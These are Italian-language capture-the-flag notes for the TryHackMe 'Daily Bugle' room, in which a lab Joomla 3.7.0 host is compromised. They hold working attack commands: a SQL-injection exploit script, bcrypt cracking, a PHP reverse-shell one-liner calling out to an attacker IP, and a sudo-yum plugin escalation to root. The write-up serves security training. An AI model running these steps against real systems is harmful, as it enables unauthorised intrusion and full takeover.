
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/dailybugle

10.10.113.200
```
sudo openvpn ~/Downloads/damaranto.ovpn
```

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.113.200 -oG risultatoscan
```

```
 cat risultatoscan
```

```
sudo nmap -sC -sV -p80,22,3306 10.10.113.200 -oN risultatoscan2
```

```
 cat risultatoscan2
```
cerchiamo versione Joomla
```
whatweb 10.10.113.200
```
niente con whatweb

```
nmap --script http-enum 10.10.113.200
```
enumeriamo con nmap e troviamo 
Joomla version 3.7.0
```
searchsploit Joomla 3.7.0
```
non troviamo lo script py richiesto da tryhackme , cerchiamo su google

https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py

lo scarichiamo

```
python3 Downloads/joomblah.py http://10.10.113.200
```
trovato
```
'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
```

```
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash
```

```
hashid hash
```
	per vedere tipo di hash (bcrypt)

```
john -wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
```
	==potremmo utilizzare anche hashcat== più utile se usiamo la gpu
trovata password
```
spiderman123
```

==entriamo== in pagina web con user: jonah pw: spiderman123
http://10.10.113.200/administrator/

i template sono vulnerabili e in php  andiamo sul template ==Beez3==
e la ==vulnerabilità sta sulla pagina error.php o index.php==

ci mettiamo una ==reverse shell!==

utiliziamo una ==ONE LINER== per fare una ==Reverse Shell==

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.9.220/1234 0>&1'");
```
mettiamo in ascolto netcat sulla porta selezionata

```
nc -lvnp 1234
```
 ed inseriamo la reverse shell nells pagina del template index.php ,salviamo e facciamo Template Preview ed ==otteniamo la shell!==

```
whoami
```

```
hostname -I
```

- - - -
==facciamo un trattamento della console cosi da poter utilizzare Ctrl vari senza crash==

```
script /dev/null -c bash
```
poi  per mandarla in background
```
Crtl+Z
```

```
stty raw -echo; fg
```
scriviamo reset ed invio
```
reset
```
tipo terminale
```
xterm
```

```
export TERM=xterm
```

```
export SHELL=bash
```

```
stty -a
```
	per vedere le nostre righe e colonne

```
stty rows 24 columns 80
```

- - - - 
nei file di configurazione potremmo trovare credenziali in chiaro

```
cat /etc/passwd
```
troviamo dei user tra cui un
```
jjameson
```

```
cat configuration.php
```
	qui troviamo una password```

```
password = 'nv5uz9r3ZEDzVjNu'
```
proviamo se è di jjameson
```
ssh jjameson@10.10.113.200
```

```
cat user.txt
```
==user flag!==
```
27a260fe3cba712cfdedb1c86d80442e
```

```
sudo -l
```

 (ALL) NOPASSWD: /usr/bin/yum

https://gtfobins.github.io/

usiamo which per vedere se c'è fpm nella macchina vittima
```
which fpm
```
non c'è quidi usiamo la seconda opzione di gtfobins

 ```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
==e siamo root!==
```
cd /root
```

```
cat root.txt
```

```
root flag!
```

```
xxxxxxxxxxxxxxxxxxxxxxx
```
